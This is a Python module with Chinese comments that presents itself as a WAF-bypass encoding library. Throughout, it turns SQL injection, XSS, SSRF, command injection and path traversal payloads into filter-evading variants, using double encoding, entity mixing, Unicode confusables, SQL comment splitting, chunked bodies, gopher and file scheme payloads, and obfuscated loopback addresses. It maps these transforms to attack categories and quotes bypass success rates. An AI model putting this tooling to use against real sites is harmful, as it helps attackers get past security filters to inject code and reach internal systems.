"""
encoder.py - WAF绕过编码工具库
集成多种编码变换技术，用于生成Payload变体

编码技术来源：
- PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings)
- payloadplayground.com 2025最佳实践
- OWASP XSS Filter Evasion Cheat Sheet
"""

import base64
import urllib.parse
import html
import re
import random
import string


# ─────────────────────────────────────────────────────────────────────────────
# 1. URL 编码类
# ─────────────────────────────────────────────────────────────────────────────

def url_encode(payload: str) -> str:
    """标准URL编码（保留字母数字，编码特殊字符）"""
    return urllib.parse.quote(payload, safe='')


def url_encode_all(payload: str) -> str:
    """全字符URL编码（连字母也编码）"""
    return ''.join(f'%{ord(c):02X}' for c in payload)


def url_double_encode(payload: str) -> str:
    """双重URL编码（成功率72%）：%27 → %2527
    来源：payloadplayground.com 2025
    """
    first = urllib.parse.quote(payload, safe='')
    # 将 % 再次编码为 %25
    return first.replace('%', '%25')


def url_encode_spaces(payload: str) -> str:
    """将空格替换为+或%20（混合使用）"""
    return payload.replace(' ', '%20')


def url_encode_spaces_plus(payload: str) -> str:
    """将空格替换为+"""
    return payload.replace(' ', '+')


def url_encode_tab(payload: str) -> str:
    """将空格替换为%09（Tab）—— 绕过空格检测（49%成功率）"""
    return payload.replace(' ', '%09')


def url_encode_newline(payload: str) -> str:
    """将空格替换为%0a（换行）—— 绕过空格检测"""
    return payload.replace(' ', '%0a')


# ─────────────────────────────────────────────────────────────────────────────
# 2. HTML 实体编码类
# ─────────────────────────────────────────────────────────────────────────────

def html_entity_encode(payload: str) -> str:
    """HTML实体编码（成功率68%）：< → &lt;  > → &gt;
    来源：payloadplayground.com 2025
    """
    return html.escape(payload, quote=True)


def html_entity_encode_dec(payload: str) -> str:
    """HTML十进制实体编码：A → &#65;
    来源：PayloadsAllTheThings Cloudflare bypass
    """
    return ''.join(f'&#{ord(c)};' for c in payload)


def html_entity_encode_hex(payload: str) -> str:
    """HTML十六进制实体编码：A → &#x41;
    来源：PayloadsAllTheThings
    """
    return ''.join(f'&#x{ord(c):02x};' for c in payload)


def html_entity_mixed(payload: str) -> str:
    """混合十进制/十六进制实体（随机混合，干扰WAF正则）
    来源：PayloadsAllTheThings - Cloudflare绕过
    &#97&#108&#101&#114&#116()
    """
    result = []
    for c in payload:
        if random.random() > 0.5:
            result.append(f'&#{ord(c)};')
        else:
            result.append(f'&#x{ord(c):02x};')
    return ''.join(result)


# ─────────────────────────────────────────────────────────────────────────────
# 3. Unicode 编码类
# ─────────────────────────────────────────────────────────────────────────────

def unicode_escape(payload: str) -> str:
    """Unicode转义：A → \\u0041
    来源：PayloadsAllTheThings - Fortiweb绕过
    \\u003e\\u003c\\u0068\\u0031onclick=alert('1')\\u003e
    """
    return ''.join(f'\\u{ord(c):04x}' for c in payload)


def unicode_fullwidth(payload: str) -> str:
    """全角Unicode字符（成功率61%）：A → Ａ (U+FF21)
    来源：payloadplayground.com 2025 - Unicode规范化绕过
    """
    result = []
    for c in payload:
        code = ord(c)
        # ASCII可打印字符（33-126）转换为全角（FF01-FF5E）
        if 33 <= code <= 126:
            result.append(chr(code + 0xFEE0))
        else:
            result.append(c)
    return ''.join(result)


def unicode_confusables(payload: str) -> str:
    """Unicode混淆字符（用相似字形替换关键字符）"""
    confusable_map = {
        'a': 'а',  # Cyrillic а (U+0430)
        'e': 'е',  # Cyrillic е (U+0435)
        'o': 'о',  # Cyrillic о (U+043E)
        'p': 'р',  # Cyrillic р (U+0440)
        'c': 'с',  # Cyrillic с (U+0441)
        'x': 'х',  # Cyrillic х (U+0445)
    }
    return ''.join(confusable_map.get(c, c) for c in payload)


# ─────────────────────────────────────────────────────────────────────────────
# 4. Base64 / UTF-16 编码类
# ─────────────────────────────────────────────────────────────────────────────

def base64_encode(payload: str) -> str:
    """Base64编码"""
    return base64.b64encode(payload.encode('utf-8')).decode('ascii')


def base64_encode_url_safe(payload: str) -> str:
    """URL安全Base64编码"""
    return base64.urlsafe_b64encode(payload.encode('utf-8')).decode('ascii')


def utf16_encode(payload: str) -> str:
    """UTF-16LE编码后转十六进制字符串"""
    encoded = payload.encode('utf-16-le')
    return encoded.hex()


def utf16_be_encode(payload: str) -> str:
    """UTF-16BE编码后转十六进制字符串"""
    encoded = payload.encode('utf-16-be')
    return encoded.hex()


# ─────────────────────────────────────────────────────────────────────────────
# 5. SQL注入专用绕过编码
# ─────────────────────────────────────────────────────────────────────────────

def sql_comment_insert(payload: str) -> str:
    """在SQL关键字中插入注释（成功率55%）
    来源：payloadplayground.com 2025
    SELECT → SE/**/LECT, UNION SELECT → UNION/**/SELECT
    """
    keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT',
                'UPDATE', 'DELETE', 'DROP', 'CREATE', 'EXEC', 'EXECUTE',
                'CAST', 'CONVERT', 'CONCAT', 'GROUP', 'ORDER', 'HAVING',
                'SLEEP', 'BENCHMARK', 'INFORMATION_SCHEMA', 'SCHEMA',
                'DATABASE', 'TABLE', 'COLUMN', 'VERSION', 'USER']
    result = payload
    for kw in keywords:
        # 在关键字中间插入注释
        mid = len(kw) // 2
        commented = kw[:mid] + '/**/' + kw[mid:]
        result = re.sub(kw, commented, result, flags=re.IGNORECASE)
    return result


def sql_case_mixed(payload: str) -> str:
    """SQL关键字大小写混合（成功率45%）
    来源：payloadplayground.com 2025
    SELECT → SeLeCt
    """
    keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT',
                'UPDATE', 'DELETE', 'DROP', 'CREATE', 'EXEC', 'SLEEP',
                'BENCHMARK', 'DATABASE', 'VERSION', 'USER', 'TABLE']
    result = payload
    for kw in keywords:
        mixed = ''.join(c.upper() if i % 2 == 0 else c.lower()
                       for i, c in enumerate(kw))
        result = re.sub(kw, mixed, result, flags=re.IGNORECASE)
    return result


def sql_null_substitute(payload: str) -> str:
    """NULL替代方案（来源：kleiton0x00/Advanced-SQL-Injection-Cheatsheet 2025）
    NULL → char(null) 或 (0*1337-0)
    """
    result = payload.replace('null', 'char(null)')
    result = result.replace('NULL', 'char(null)')
    return result


def sql_whitespace_variant(payload: str) -> str:
    """多种空白符替代（Tab/换行/回车/换页）"""
    ws_chars = ['\t', '\n', '\r', '\x0b', '\x0c', '/**/', '%09', '%0a']
    result = []
    for c in payload:
        if c == ' ':
            result.append(random.choice(ws_chars))
        else:
            result.append(c)
    return ''.join(result)


def sql_hex_encode_strings(payload: str) -> str:
    """将字符串值转换为十六进制（绕过字符串过滤）
    例：'admin' → 0x61646d696e
    """
    def to_hex(m):
        s = m.group(1)
        return '0x' + s.encode('utf-8').hex()
    return re.sub(r"'([^']+)'", to_hex, payload)


# ─────────────────────────────────────────────────────────────────────────────
# 6. HTTP协议层绕过
# ─────────────────────────────────────────────────────────────────────────────

def chunked_body(payload: str, chunk_size: int = 3) -> list[tuple[str, str]]:
    """分块传输编码（成功率83%）
    来源：payloadplayground.com 2025
    返回: [(chunk_size_hex, chunk_data), ...] 用于构建分块请求体
    """
    chunks = []
    data = payload.encode('utf-8')
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        chunks.append((format(len(chunk), 'x'), chunk.decode('utf-8', errors='replace')))
    chunks.append(('0', ''))  # 终止块
    return chunks


def build_chunked_body(payload: str, chunk_size: int = 3) -> str:
    """构建完整的分块传输编码请求体字符串"""
    chunks = chunked_body(payload, chunk_size)
    result = ''
    for size_hex, data in chunks:
        result += size_hex + '\r\n'
        if data:
            result += data + '\r\n'
    return result


def null_byte_inject(payload: str) -> str:
    """空字节注入（38%成功率）：在关键位置插入%00
    来源：payloadplayground.com 2025
    """
    # 在点号前插入空字节（文件路径绕过）
    result = payload.replace('.', '%00.')
    return result


def http_param_pollution(param_name: str, payload: str) -> dict:
    """HTTP参数污染：同名参数多次传值
    来源：payloadplayground.com 2025
    WAF检测第一个值，后端取最后一个值
    """
    return {
        'original': f'{param_name}=innocent_value&{param_name}={payload}',
        'params': [(param_name, 'innocent_value'), (param_name, payload)]
    }


def oversized_body_prefix(payload: str, size_kb: int = 64) -> str:
    """超大数据包绕过：在Payload前填充垃圾数据
    来源：腾讯云 2022 WAF绕过实战总结
    许多WAF只检测前几KB，将Payload放在最后
    """
    padding = 'x' * (size_kb * 1024)
    return f'garbage={padding}&attack={payload}'


# ─────────────────────────────────────────────────────────────────────────────
# 7. XSS专用绕过编码
# ─────────────────────────────────────────────────────────────────────────────

def xss_case_mix_events(payload: str) -> str:
    """XSS事件名大小写混合
    来源：PayloadsAllTheThings - Akamai绕过
    onload → OnLoAd，onclick → OnClIcK
    """
    events = ['onload', 'onclick', 'onerror', 'onmouseover', 'onfocus',
              'ontoggle', 'onanimationstart', 'onblur', 'onchange']
    result = payload
    for evt in events:
        mixed = ''.join(c.upper() if i % 2 == 0 else c.lower()
                       for i, c in enumerate(evt))
        result = re.sub(evt, mixed, result, flags=re.IGNORECASE)
    return result


def xss_svg_tag(payload: str) -> str:
    """使用SVG标签包装XSS（绕过script标签过滤）
    来源：PayloadsAllTheThings - Cloudflare绕过
    """
    # 提取JS代码部分
    js_match = re.search(r'alert\(([^)]*)\)', payload)
    if js_match:
        return f'<svg/onload=alert({js_match.group(1)})>'
    return f'<svg/onload={payload}>'


def xss_details_tag(payload: str) -> str:
    """使用details/summary标签（绕过script/img过滤）
    来源：PayloadsAllTheThings - Akamai绕过
    <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
    """
    js_match = re.search(r'alert\(([^)]*)\)', payload)
    js_code = f'alert({js_match.group(1)})' if js_match else payload
    return f'<dETAILS%0aopen%0aonToGgle%0a=%0a{js_code}>'


def xss_template_literal(payload: str) -> str:
    """模板字符串绕过（ES6）
    来源：PayloadsAllTheThings - Cloudflare绕过
    alert(1) → `${alert`1`}`
    """
    js_match = re.search(r'alert\(([^)]*)\)', payload)
    if js_match:
        arg = js_match.group(1).strip("'\"")
        return f'<svg/OnLoad="`${{alert`{arg}`}}`">'
    return payload


def xss_insert_null_bytes(payload: str) -> str:
    """在关键词中插入空字节或零宽字符"""
    # 在script中间插入HTML注释
    result = payload.replace('<script', '<scr\x00ipt')
    result = result.replace('javascript:', 'javas\x00cript:')
    return result


# ─────────────────────────────────────────────────────────────────────────────
# 8. SSRF专用绕过编码
# ─────────────────────────────────────────────────────────────────────────────

def ssrf_ip_decimal(ip: str) -> str:
    """IP地址转十进制（绕过IP黑名单）
    127.0.0.1 → 2130706433
    来源：最佳实践
    """
    parts = ip.split('.')
    if len(parts) == 4:
        try:
            decimal = sum(int(p) << (24 - 8 * i) for i, p in enumerate(parts))
            return str(decimal)
        except ValueError:
            return ip
    return ip


def ssrf_ip_octal(ip: str) -> str:
    """IP地址转八进制（绕过IP黑名单）
    127.0.0.1 → 0177.0.0.01
    """
    parts = ip.split('.')
    if len(parts) == 4:
        try:
            return '.'.join('0' + oct(int(p))[2:] for p in parts)
        except ValueError:
            return ip
    return ip


def ssrf_ip_hex(ip: str) -> str:
    """IP地址转十六进制（绕过IP黑名单）
    127.0.0.1 → 0x7f000001
    """
    parts = ip.split('.')
    if len(parts) == 4:
        try:
            return '0x' + ''.join(f'{int(p):02x}' for p in parts)
        except ValueError:
            return ip
    return ip


def ssrf_gopher_scheme(host: str, port: int, data: str) -> str:
    """构建gopher协议SSRF Payload
    来源：最佳实践
    """
    encoded_data = urllib.parse.quote(data)
    return f'gopher://{host}:{port}/_{encoded_data}'


def ssrf_dict_scheme(host: str, port: int, cmd: str) -> str:
    """构建dict协议SSRF Payload"""
    return f'dict://{host}:{port}/{cmd}'


def ssrf_file_scheme(path: str) -> str:
    """file://协议读取本地文件"""
    return f'file://{path}'


def ssrf_redirect_bypass(redirect_url: str, final_url: str) -> str:
    """通过302跳转绕过SSRF过滤"""
    # 假设有一个开放重定向服务
    return f'{redirect_url}?redirect={urllib.parse.quote(final_url)}'


def ssrf_dns_rebinding_placeholder() -> str:
    """DNS重绑定占位符（实际测试需配合工具）"""
    return 'http://attacker-rebind.example.com/'


# ─────────────────────────────────────────────────────────────────────────────
# 9. 路径遍历专用编码
# ─────────────────────────────────────────────────────────────────────────────

def path_traversal_encode(payload: str) -> list[str]:
    """路径遍历多种编码变体"""
    variants = [
        payload,                                          # 原始
        payload.replace('../', '%2e%2e%2f'),              # URL编码
        payload.replace('../', '%2e%2e/'),                # 部分编码
        payload.replace('../', '..%2f'),                  # 部分编码2
        payload.replace('../', '%2e%2e%5c'),              # 反斜杠
        payload.replace('../', '....//'),                 # 双点双斜杠
        payload.replace('../', '.%2e/'),                  # 混合
        payload.replace('../', '%252e%252e%252f'),         # 双重URL编码
        payload.replace('../', '..././'),                 # 额外点
        payload.replace('../', '%c0%ae%c0%ae/'),          # 非法UTF-8
    ]
    return list(set(variants))  # 去重


# ─────────────────────────────────────────────────────────────────────────────
# 10. 主接口：获取所有变体
# ─────────────────────────────────────────────────────────────────────────────

# 编码函数注册表
ENCODE_FUNCTIONS = {
    'raw':              lambda p: p,
    'url':              url_encode,
    'url_all':          url_encode_all,
    'double_url':       url_double_encode,
    'url_tab':          url_encode_tab,
    'url_newline':      url_encode_newline,
    'html_entity':      html_entity_encode,
    'html_dec':         html_entity_encode_dec,
    'html_hex':         html_entity_encode_hex,
    'html_mixed':       html_entity_mixed,
    'unicode_escape':   unicode_escape,
    'unicode_fullwidth': unicode_fullwidth,
    'base64':           base64_encode,
    'sql_comment':      sql_comment_insert,
    'sql_case':         sql_case_mixed,
    'sql_null':         sql_null_substitute,
    'sql_whitespace':   sql_whitespace_variant,
    'sql_hex_str':      sql_hex_encode_strings,
    'xss_case_event':   xss_case_mix_events,
    'xss_svg':          xss_svg_tag,
    'xss_details':      xss_details_tag,
    'xss_template':     xss_template_literal,
    'null_byte':        null_byte_inject,
}


def apply_encoding(payload: str, encoding: str) -> str:
    """应用指定编码到Payload"""
    func = ENCODE_FUNCTIONS.get(encoding)
    if func:
        try:
            return func(payload)
        except Exception:
            return payload
    return payload


def get_variants(payload: str, encodings: list[str]) -> list[dict]:
    """
    生成Payload的所有编码变体

    Returns:
        List of dicts: [{
            'payload': str,
            'encoding': str,
            'description': str
        }]
    """
    variants = []
    for encoding in encodings:
        try:
            encoded = apply_encoding(payload, encoding)
            if encoded != payload or encoding == 'raw':
                variants.append({
                    'payload': encoded,
                    'encoding': encoding,
                    'original': payload
                })
        except Exception:
            continue
    return variants


# 各攻击类别默认启用的编码变体
CATEGORY_DEFAULT_ENCODINGS = {
    'sqli': ['raw', 'url', 'double_url', 'sql_comment', 'sql_case',
             'sql_whitespace', 'sql_hex_str', 'url_tab', 'url_newline'],
    'xss':  ['raw', 'url', 'double_url', 'html_dec', 'html_hex',
             'html_mixed', 'unicode_escape', 'xss_case_event',
             'xss_svg', 'xss_details', 'xss_template'],
    'cmd':  ['raw', 'url', 'double_url', 'url_tab', 'url_newline',
             'null_byte', 'url_all'],
    'ssrf': ['raw', 'url', 'double_url', 'url_all'],
    'lfi':  ['raw', 'url', 'double_url', 'url_all', 'null_byte'],
    'path_traversal': ['raw', 'url', 'double_url', 'url_all'],
    'upload': ['raw', 'url'],
    'auth_bypass': ['raw', 'url', 'double_url'],
    'nosql': ['raw', 'url', 'double_url'],
    'ssti':  ['raw', 'url', 'double_url', 'url_all'],
    'cve':   ['raw', 'url', 'double_url'],
    'default': ['raw', 'url', 'double_url'],
}


if __name__ == '__main__':
    # 简单测试
    test_payload = "' UNION SELECT 1,2,3--"
    print(f"原始Payload: {test_payload}")
    print(f"SQL注释绕过: {sql_comment_insert(test_payload)}")
    print(f"SQL大小写:   {sql_case_mixed(test_payload)}")
    print(f"双重URL编码: {url_double_encode(test_payload)}")
    print(f"Tab替换空格: {url_encode_tab(test_payload)}")
    print(f"HTML十进制:  {html_entity_encode_dec(test_payload[:10])}")
    print(f"Unicode转义: {unicode_escape(test_payload[:10])}")
    print()
    print(f"SSRF-127.0.0.1十进制: {ssrf_ip_decimal('127.0.0.1')}")
    print(f"SSRF-127.0.0.1八进制: {ssrf_ip_octal('127.0.0.1')}")
    print(f"SSRF-127.0.0.1十六进制: {ssrf_ip_hex('127.0.0.1')}")
